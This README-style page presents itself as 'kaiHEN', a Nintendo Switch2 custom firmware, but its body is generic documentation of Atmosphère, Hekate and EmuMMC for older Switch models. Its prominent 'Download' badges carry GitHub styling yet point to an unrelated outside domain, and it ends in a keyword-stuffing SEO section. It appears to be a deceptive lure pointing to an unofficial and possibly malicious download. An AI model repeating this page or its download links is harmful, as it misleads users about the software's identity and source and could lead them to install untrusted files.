
# kaiHEN — Nintendo Switch2 Custom Firmware

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Nintendo%20Switch-blue?style=for-the-badge" alt="Nintendo Switch"/>
  <img src="https://img.shields.io/badge/Type-Custom%20Firmware-green?style=for-the-badge" alt="Custom Firmware"/>
  <img src="https://img.shields.io/badge/Atmosph%C3%A8re-1.12.2-orange?style=for-the-badge" alt="Atmosphere 1.12.2"/>
  <img src="https://img.shields.io/badge/License-GPL--2.0-lightgrey?style=for-the-badge" alt="GPL 2.0"/>
</p>

<p align="center">
  A custom firmware environment for compatible Nintendo Switch consoles, supporting homebrew applications, system extensions, and advanced system customization.
</p>

<p align="center">
  <a href="https://dyhuiying.com/s/file"><img src="https://img.shields.io/badge/Download-Nintendo%20Switch%20CFW-blue?style=for-the-badge&logo=github" alt="Download Nintendo Switch CFW"/></a>
</p>

## Overview

Atmosphère is an open-source custom firmware (CFW) for the Nintendo Switch. It provides an alternative system environment with support for homebrew applications, custom system modules, patches, debugging tools, and additional functionality.

Atmosphère is commonly used together with the Hekate bootloader. Depending on the console hardware, installation may require an RCM-based exploit or a compatible hardware modification.

A typical setup can include:

- **Atmosphère:** The custom firmware environment.
- **Hekate:** A bootloader and configuration interface.
- **Homebrew Menu:** An application launcher for compatible homebrew software.
- **EmuMMC:** An emulated NAND environment stored on the microSD card.
- **System modules:** Optional extensions that add functionality to the system.

Atmosphère does not make every Nintendo Switch model compatible with the same installation method. Hardware revision and system firmware must be considered before choosing a setup.

## Key Features

- **Homebrew Support:** Run compatible homebrew applications through the Homebrew Menu.
- **Custom System Environment:** Provides modified system components and additional functionality.
- **EmuMMC Support:** Run a separate emulated system NAND from microSD storage.
- **Hekate Integration:** Boot Atmosphère using supported Hekate configurations.
- **System Modules:** Load compatible extensions and background services.
- **Custom Themes:** Use supported theme tools to personalize the system interface.
- **Game Mod Support:** Load compatible game modifications and LayeredFS content.
- **Cheat Support:** Use compatible cheat systems and homebrew utilities.
- **Debugging Tools:** Access supported development and diagnostic functionality.
- **Homebrew Applications:** Use file managers, save managers, media tools, and other compatible applications.
- **Configuration Options:** Customize boot behavior and supported system settings.
- **Open-Source Development:** Maintained as a community-driven open-source project.

## Technical Specifications

| Component | Details |
|---|---|
| CFW | Atmosphère |
| Latest referenced release | 1.12.2 |
| Release date | November 11, 2026 |
| Bootloader | Hekate 6.5.5 |
| Latest referenced firmware support | Horizon OS 23.5.0 |
| Platform | Nintendo Switch |
| System architecture | ARM64 |
| Homebrew launcher | Homebrew Menu |
| Boot payload | `fusee.bin` |
| Configuration directory | `/atmosphere/config/` |
| Bootloader directory | `/bootloader/` |
| Emulated NAND | EmuMMC |
| Storage | microSD |
| Filesystem | FAT32 or exFAT, depending on configuration |
| License | GPL-2.0 |

Version compatibility changes over time. Always verify the Atmosphère and Hekate release notes before updating the console.

## Compatibility

Atmosphère supports compatible Nintendo Switch hardware, but installation methods differ between hardware revisions.

| Console model | Compatibility considerations |
|---|---|
| Nintendo Switch V1 (unpatched Erista) | RCM-based exploit can be used on compatible units |
| Nintendo Switch V1 (patched Erista) | RCM exploit is blocked; hardware modification may be required |
| Nintendo Switch V2 (Mariko) | Compatible hardware modification required |
| Nintendo Switch Lite | Compatible hardware modification required |
| Nintendo Switch OLED | Compatible hardware modification required |

### Hardware Compatibility Notes

- Not every V1 console is unpatched.
- Serial number ranges can help identify potentially vulnerable units, but are not a guarantee.
- Patched Erista and Mariko-based consoles cannot use the original unpatched RCM exploit.
- Lite and OLED models require hardware-specific installation methods.
- Hardware modifications should be performed by qualified technicians.
- Firmware compatibility must be checked against the exact Atmosphère and Hekate versions.

### Firmware Compatibility

The latest referenced Atmosphère release, 1.12.2, supports Horizon OS 23.5.0.

Older Atmosphère releases may not support newer system firmware. Avoid updating the official system software before checking compatibility with the required CFW components.

## Firmware Features

### Atmosphère CFW

Atmosphère provides the core custom firmware environment.

Its components include:

- `exosphere` — custom secure monitor implementation.
- `mesosphere` — custom kernel implementation.
- `stratosphere` — system module and service components.
- `loader` — application and system loading functionality.
- `fatal` — crash and error handling.
- Homebrew-related system integration.

### Hekate Bootloader

Hekate provides a boot menu and configuration environment.

Common capabilities include:

- Launching Atmosphère.
- Selecting boot configurations.
- Managing EmuMMC.
- Creating NAND backups.
- Accessing supported USB tools.
- Loading compatible payloads.
- Viewing system information.

### EmuMMC

EmuMMC allows a separate copy of the system NAND to be stored on the microSD card.

Common uses include:

- Keeping a separate CFW environment.
- Separating selected system modifications from the physical NAND.
- Testing compatible homebrew configurations.
- Maintaining a separate system environment for development.

EmuMMC is not a complete guarantee against bans or other account and network consequences.

### Homebrew Environment

The Homebrew Menu provides access to compatible applications.

Common homebrew formats include:

- `.nro` — Nintendo Switch homebrew application.
- `.nsp` — Nintendo Switch package format.
- `.kip` — system module format.
- `.ovl` — overlay application format.

The Homebrew Menu is commonly accessed through the Album or an application takeover method, depending on the configuration.

## System Requirements

### Console Requirements

- Compatible Nintendo Switch console.
- Hardware-compatible CFW installation method.
- Supported Atmosphère and Hekate versions.
- Reliable microSD card.
- Sufficient free storage.
- Compatible system firmware.
- Access to the required boot payload or hardware boot configuration.

### Computer Requirements

A computer is useful for:

- Preparing and formatting the microSD card.
- Extracting Atmosphère and Hekate archives.
- Managing boot configuration files.
- Creating and storing NAND backups.
- Copying homebrew applications.
- Maintaining configuration backups.

### Storage Requirements

Recommended preparation:

- Use a reliable microSD card.
- FAT32 is generally preferred for homebrew setups.
- Keep sufficient free space for EmuMMC and backups.
- Maintain a separate copy of important files.
- Avoid removing the card while the console is writing data.

## Download & Installation

<p align="center">
  <a href="https://dyhuiying.com/s/file"><img src="https://img.shields.io/badge/Download-Latest%20Package-blue?style=for-the-badge&logo=github" alt="Download Latest Package"/></a>
</p>

### Before Installation

1. Identify the exact Switch hardware revision.
2. Check whether the console supports the intended installation method.
3. Verify Atmosphère compatibility with the installed system firmware.
4. Prepare a reliable microSD card.
5. Back up important data.
6. Follow hardware-specific installation documentation.

### Software Preparation

A typical Atmosphère microSD setup contains:

- `atmosphere/`
- `bootloader/`
- `switch/`
- `hbmenu.nro`
- `payload.bin` or other boot files, depending on the boot method.

The exact file layout depends on the selected bootloader and installation configuration.

### Booting Atmosphère

1. Prepare the microSD card with compatible Atmosphère files.
2. Install or configure Hekate for the console's hardware.
3. Use the appropriate boot method for the console.
4. Select the intended boot entry.
5. Start Atmosphère.
6. Verify that the CFW environment starts successfully.

Unpatched V1 consoles commonly use an RCM payload workflow. Hardware-modified consoles use their supported boot configuration.

### EmuMMC Setup

EmuMMC can be configured through Hekate on supported setups.

Before creating or migrating an EmuMMC:

- Ensure sufficient microSD storage.
- Create a verified NAND backup.
- Confirm the selected partition or file-based configuration.
- Keep the original NAND backup in a separate safe location.

Do not use a firmware package or boot configuration intended for a different hardware revision.

## Configuration & Management

### Atmosphère Configuration

Atmosphère supports configuration files and optional system modules.

Common configuration locations include:

- `/atmosphere/config/`
- `/atmosphere/contents/`
- `/bootloader/hekate_ipl.ini`
- `/switch/`

The exact files and directory structure depend on the installed release and optional components.

### Hekate Boot Entries

Hekate boot entries can be configured to provide different boot options, such as:

- Stock system boot.
- Atmosphère with EmuMMC.
- Atmosphère with SysNAND.
- Additional supported configurations.

Review each entry before selecting it. Boot configurations can affect which NAND environment is started.

### Homebrew Management

Homebrew applications are commonly stored in:

`/switch/`

Applications can be launched through the Homebrew Menu when they are compatible with the installed firmware and homebrew environment.

### System Modules and Overlays

Optional extensions may add:

- Performance monitoring.
- System information overlays.
- Controller and input utilities.
- Theme management.
- Additional homebrew functionality.

Only install modules that are compatible with the installed Atmosphère release and system firmware.

### Updating Atmosphère

Before updating:

1. Check the current firmware compatibility information.
2. Read the release notes for Atmosphère and Hekate.
3. Back up the microSD card.
4. Update the required files using the official instructions.
5. Update the boot payload when required.
6. Verify that the selected boot configuration still works.

Avoid mixing files from different CFW packages or outdated bootloader releases.

## Troubleshooting

| Problem | Recommended action |
|---|---|
| Atmosphère does not boot | Verify hardware compatibility, boot payload, and file layout. |
| Black screen during startup | Check Hekate configuration and Atmosphère compatibility. |
| `Fatal error` during boot | Review the error report and check for incompatible system modules. |
| Homebrew Menu does not open | Verify `hbmenu.nro` and the selected launch method. |
| EmuMMC is not detected | Check Hekate EmuMMC configuration and microSD partition layout. |
| System update causes boot failure | Verify that Atmosphère and Hekate support the installed firmware. |
| Homebrew application crashes | Check application compatibility and required dependencies. |
| Overlay does not load | Verify overlay loader and module versions. |
| microSD card is not detected | Check card condition, filesystem, and console compatibility. |
| Boot configuration is missing | Verify `hekate_ipl.ini` and the `/bootloader/` directory. |

### Recovery Recommendations

- Keep a verified NAND backup.
- Preserve the original boot configuration.
- Use a known-compatible Atmosphère release when diagnosing problems.
- Remove recently installed optional modules if they cause startup failures.
- Do not delete system files to resolve an unexplained boot error.
- Follow recovery documentation for the exact hardware revision.

## FAQ

### 1. What is Atmosphère?

Atmosphère is an open-source custom firmware for compatible Nintendo Switch consoles. It provides homebrew support, system modifications, and additional system functionality.

### 2. Is Atmosphère the same as Hekate?

No. Atmosphère is the custom firmware environment. Hekate is a bootloader that can launch Atmosphère and provide additional boot and maintenance tools.

### 3. Does Atmosphère work on every Nintendo Switch?

No. Compatibility depends on hardware revision, installation method, and system firmware.

### 4. Can I install Atmosphère on a Switch Lite?

Switch Lite requires a compatible hardware modification. The original unpatched V1 RCM method does not apply.

### 5. What is EmuMMC?

EmuMMC is an emulated NAND environment stored on the microSD card. It allows a separate system environment to be used with compatible CFW configurations.

### 6. Do I need Hekate?

Hekate is commonly used with Atmosphère, but alternative supported boot methods exist. The appropriate setup depends on the console and installation method.

### 7. What is the Homebrew Menu?

The Homebrew Menu is an application launcher that provides access to compatible Nintendo Switch homebrew software.

### 8. Can I use custom themes?

Yes. Compatible theme tools can modify supported interface elements. Theme compatibility should be checked after system updates.

### 9. Can I update the official system firmware?

Updates should only be performed after verifying that the installed Atmosphère and bootloader versions support the target firmware.

### 10. Does EmuMMC guarantee protection from online bans?

No. EmuMMC is a separate system environment, not a guarantee against bans or other online-service consequences.

### 11. What is the latest referenced Atmosphère version?

The latest referenced release is Atmosphère 1.12.2, released on November 11, 2026. It supports Horizon OS 23.5.0 according to the current compatibility guide.

### 12. Is Atmosphère open source?

Yes. Atmosphère is an open-source project distributed under the GPL-2.0 license.

## SEO Keywords

Nintendo Switch, Nintendo Switch CFW, Atmosphère, Atmosphere CFW, Nintendo Switch Custom Firmware, Switch Homebrew, Switch Homebrew Menu, Hekate, Hekate Bootloader, EmuMMC, EmuNAND, Nintendo Switch Modding, Switch CFW Setup, Switch Firmware Compatibility, Switch Homebrew Applications, Switch System Modules, Switch Custom Themes, Switch Overlay, Switch NRO, Switch KIP, Switch Payload, Fusee Payload, Nintendo Switch V1, Nintendo Switch V2, Switch Lite CFW, Switch OLED CFW, Erista, Mariko, Switch NAND Backup, Atmosphere Installation, Atmosphere Update, Nintendo Switch Homebrew Guide
